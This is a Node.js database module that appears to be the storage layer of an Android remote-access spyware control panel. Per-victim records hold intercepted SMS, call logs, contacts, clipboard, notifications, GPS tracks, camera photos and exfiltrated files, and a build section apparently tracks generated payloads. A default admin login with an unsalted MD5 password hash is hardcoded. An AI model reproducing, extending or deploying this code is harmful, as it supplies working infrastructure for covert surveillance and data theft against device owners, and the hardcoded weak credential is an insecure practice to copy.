const fs = require('fs');
const path = require('path');
const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
const config = require('./config');

// Initialize logging (we can't use logger here as it depends on db)
const logInit = (type, msg) => console.log(`[${new Date().toISOString()}] [${type}] ${msg}`);

// Ensure directories exist
try {
    const dirs = [
        config.dbPath, 
        config.downloadsPath, 
        config.photosPath, 
        path.join(config.dbPath, 'clients'),
        path.join(config.dbPath, 'backups')
    ];
    
    dirs.forEach(dir => {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
            logInit('INFO', `Created directory: ${dir}`);
        }
    });
} catch (e) {
    logInit('ERROR', `Failed to create directories: ${e.message}`);
}

// Main database
let main;
try {
    const mainPath = path.join(config.dbPath, 'main.json');
    const mainAdapter = new FileSync(mainPath);
    main = low(mainAdapter);
    
    main.defaults({
        admin: { 
            user: 'admin', 
            pass: '2ceb2612c67290db4f1f42593daf85d7', // MD5 of 'fason'
            token: '',
            lastLogin: null,
            loginCount: 0
        },
        clients: [],
        settings: {
            serverStart: new Date().toISOString(),
            version: '2.2.0',
            maxClients: 500,
            maxDownloads: 100,
            maxPhotos: 100
        },
        build: {
            serverUrl: '',
            homePageUrl: '',
            lastBuild: null,
            buildCount: 0
        }
    }).write();
    
    // Run migrations if needed
    const settings = main.get('settings').value();
    if (!settings.version || settings.version < '2.2.0') {
        main.get('settings').assign({ version: '2.2.0' }).write();
        logInit('INFO', 'Database migrated to v2.2.0');
    }
    
    logInit('INFO', 'Main database initialized');
} catch (e) {
    logInit('ERROR', `Failed to initialize main database: ${e.message}`);
    process.exit(1);
}

// Client database cache
const clientDbs = {};

// Default client data schema
const defaultClientSchema = (id) => ({
    id,
    queue: [],
    sms: [],
    calls: [],
    contacts: [],
    wifi: [],
    clipboard: [],
    notifications: [],
    permissions: [],
    apps: [],
    gps: [],
    gpsInterval: 0,
    downloads: [],
    files: [],
    currentPath: '',
    cameras: [],
    photos: [],
    // New fields
    callsLimit: 250,
    smsLimit: 250,
    gpsLimit: 100,
    notificationsLimit: 200,
    clipboardLimit: 200,
    lastUpdated: new Date().toISOString()
});

// Get or create client database
function client(id) {
    if (!id || typeof id !== 'string') {
        logInit('ERROR', 'Invalid client ID');
        return null;
    }
    
    // Return cached db if exists
    if (clientDbs[id]) {
        return clientDbs[id];
    }
    
    try {
        const file = path.join(config.dbPath, 'clients', `${id}.json`);
        const adapter = new FileSync(file);
        const db = low(adapter);
        
        // Set defaults
        db.defaults(defaultClientSchema(id)).write();
        
        // Update last accessed
        db.set('lastUpdated', new Date().toISOString()).write();
        
        clientDbs[id] = db;
        return db;
    } catch (e) {
        logInit('ERROR', `Failed to create client database for ${id}: ${e.message}`);
        return null;
    }
}

// Get all client IDs
function getClientIds() {
    try {
        const clientsDir = path.join(config.dbPath, 'clients');
        if (!fs.existsSync(clientsDir)) return [];
        
        return fs.readdirSync(clientsDir)
            .filter(f => f.endsWith('.json'))
            .map(f => f.replace('.json', ''));
    } catch (e) {
        logInit('ERROR', `Failed to get client IDs: ${e.message}`);
        return [];
    }
}

// Check if client exists
function clientExists(id) {
    const file = path.join(config.dbPath, 'clients', `${id}.json`);
    return fs.existsSync(file);
}

// Delete client data
function deleteClient(id) {
    try {
        // Remove from main database
        main.get('clients').remove({ id }).write();
        
        // Delete client database file
        const file = path.join(config.dbPath, 'clients', `${id}.json`);
        if (fs.existsSync(file)) {
            fs.unlinkSync(file);
        }
        
        // Remove from cache
        delete clientDbs[id];
        
        // Clean up downloads
        cleanClientFiles(id);
        
        return true;
    } catch (e) {
        logInit('ERROR', `Failed to delete client ${id}: ${e.message}`);
        return false;
    }
}

// Clear client data (keep client record, clear data)
function clearClientData(id) {
    try {
        const cdb = client(id);
        if (!cdb) return false;
        
        cdb.assign(defaultClientSchema(id)).write();
        return true;
    } catch (e) {
        logInit('ERROR', `Failed to clear client data ${id}: ${e.message}`);
        return false;
    }
}

// Clean client files
function cleanClientFiles(id) {
    try {
        // Clean downloads
        const downloads = fs.existsSync(config.downloadsPath) 
            ? fs.readdirSync(config.downloadsPath).filter(f => f.startsWith(id))
            : [];
        downloads.forEach(f => {
            try {
                fs.unlinkSync(path.join(config.downloadsPath, f));
            } catch (ignored) {}
        });
        
        // Clean photos
        const photos = fs.existsSync(config.photosPath)
            ? fs.readdirSync(config.photosPath).filter(f => f.startsWith(id))
            : [];
        photos.forEach(f => {
            try {
                fs.unlinkSync(path.join(config.photosPath, f));
            } catch (ignored) {}
        });
    } catch (e) {
        logInit('WARNING', `Failed to clean files for ${id}`);
    }
}

// Trim data to prevent unbounded growth
function trimClientData(id) {
    try {
        const cdb = client(id);
        if (!cdb) return false;
        
        const maxGps = 100;
        const maxNotifications = 200;
        const maxClipboard = 200;
        const maxDownloads = 100;
        const maxPhotos = 100;
        
        // Trim GPS
        const gps = cdb.get('gps').value() || [];
        if (gps.length > maxGps) {
            cdb.set('gps', gps.slice(-maxGps)).write();
        }
        
        // Trim notifications
        const notifs = cdb.get('notifications').value() || [];
        if (notifs.length > maxNotifications) {
            cdb.set('notifications', notifs.slice(-maxNotifications)).write();
        }
        
        // Trim clipboard
        const clipboard = cdb.get('clipboard').value() || [];
        if (clipboard.length > maxClipboard) {
            cdb.set('clipboard', clipboard.slice(-maxClipboard)).write();
        }
        
        // Trim downloads
        const downloads = cdb.get('downloads').value() || [];
        if (downloads.length > maxDownloads) {
            const toRemove = downloads.slice(0, downloads.length - maxDownloads);
            toRemove.forEach(item => {
                try {
                    const filePath = path.join(config.downloadsPath, path.basename(item.file));
                    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
                } catch (ignored) {}
            });
            cdb.set('downloads', downloads.slice(-maxDownloads)).write();
        }
        
        // Trim photos
        const photos = cdb.get('photos').value() || [];
        if (photos.length > maxPhotos) {
            const toRemove = photos.slice(0, photos.length - maxPhotos);
            toRemove.forEach(item => {
                try {
                    const filePath = path.join(config.photosPath, path.basename(item.file));
                    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
                } catch (ignored) {}
            });
            cdb.set('photos', photos.slice(-maxPhotos)).write();
        }
        
        return true;
    } catch (e) {
        logInit('ERROR', `Failed to trim client data ${id}: ${e.message}`);
        return false;
    }
}

// Get database stats
function getStats() {
    try {
        const clientIds = getClientIds();
        let totalSize = 0;
        
        // Get main db size
        const mainPath = path.join(config.dbPath, 'main.json');
        if (fs.existsSync(mainPath)) {
            totalSize += fs.statSync(mainPath).size;
        }
        
        // Get logs db size
        const logsPath = path.join(config.dbPath, 'logs.json');
        if (fs.existsSync(logsPath)) {
            totalSize += fs.statSync(logsPath).size;
        }
        
        // Get client dbs size
        let clientSize = 0;
        clientIds.forEach(id => {
            const file = path.join(config.dbPath, 'clients', `${id}.json`);
            if (fs.existsSync(file)) {
                const size = fs.statSync(file).size;
                totalSize += size;
                clientSize += size;
            }
        });
        
        // Get downloads size
        let downloadsSize = 0;
        if (fs.existsSync(config.downloadsPath)) {
            fs.readdirSync(config.downloadsPath).forEach(f => {
                try {
                    downloadsSize += fs.statSync(path.join(config.downloadsPath, f)).size;
                } catch (ignored) {}
            });
        }
        
        // Get photos size
        let photosSize = 0;
        if (fs.existsSync(config.photosPath)) {
            fs.readdirSync(config.photosPath).forEach(f => {
                try {
                    photosSize += fs.statSync(path.join(config.photosPath, f)).size;
                } catch (ignored) {}
            });
        }
        
        return {
            clientCount: clientIds.length,
            dbSize: totalSize,
            clientDbSize: clientSize,
            downloadsSize,
            photosSize,
            totalSize: totalSize + downloadsSize + photosSize,
            downloadsPath: config.downloadsPath,
            photosPath: config.photosPath
        };
    } catch (e) {
        return { error: e.message };
    }
}

// Backup database
function backup(backupPath) {
    try {
        const backupDir = backupPath || path.join(
            config.dbPath, 
            'backups', 
            `backup-${new Date().toISOString().replace(/[:.]/g, '-')}`
        );
        fs.mkdirSync(backupDir, { recursive: true });
        
        // Copy main db
        const mainPath = path.join(config.dbPath, 'main.json');
        if (fs.existsSync(mainPath)) {
            fs.copyFileSync(mainPath, path.join(backupDir, 'main.json'));
        }
        
        // Copy logs db
        const logsPath = path.join(config.dbPath, 'logs.json');
        if (fs.existsSync(logsPath)) {
            fs.copyFileSync(logsPath, path.join(backupDir, 'logs.json'));
        }
        
        // Copy client dbs
        const clientsDir = path.join(config.dbPath, 'clients');
        const backupClientsDir = path.join(backupDir, 'clients');
        fs.mkdirSync(backupClientsDir, { recursive: true });
        
        if (fs.existsSync(clientsDir)) {
            fs.readdirSync(clientsDir)
                .filter(f => f.endsWith('.json'))
                .forEach(f => {
                    fs.copyFileSync(
                        path.join(clientsDir, f),
                        path.join(backupClientsDir, f)
                    );
                });
        }
        
        logInit('INFO', `Backup created: ${backupDir}`);
        return { success: true, path: backupDir };
    } catch (e) {
        logInit('ERROR', `Backup failed: ${e.message}`);
        return { success: false, error: e.message };
    }
}

// Cleanup old backups (keep last 10)
function cleanupBackups() {
    try {
        const backupsDir = path.join(config.dbPath, 'backups');
        if (!fs.existsSync(backupsDir)) return;
        
        const backups = fs.readdirSync(backupsDir)
            .filter(f => f.startsWith('backup-'))
            .sort()
            .reverse();
        
        // Remove old backups (keep last 10)
        backups.slice(10).forEach(f => {
            try {
                const dir = path.join(backupsDir, f);
                fs.rmSync(dir, { recursive: true, force: true });
                logInit('INFO', `Removed old backup: ${f}`);
            } catch (ignored) {}
        });
    } catch (e) {
        logInit('WARNING', `Backup cleanup failed: ${e.message}`);
    }
}

// Run cleanup periodically
setInterval(() => {
    getClientIds().forEach(id => trimClientData(id));
    cleanupBackups();
}, 3600000); // Every hour

module.exports = { 
    main, 
    client, 
    getClientIds, 
    clientExists,
    deleteClient, 
    clearClientData,
    trimClientData,
    getStats, 
    backup,
    cleanupBackups
};
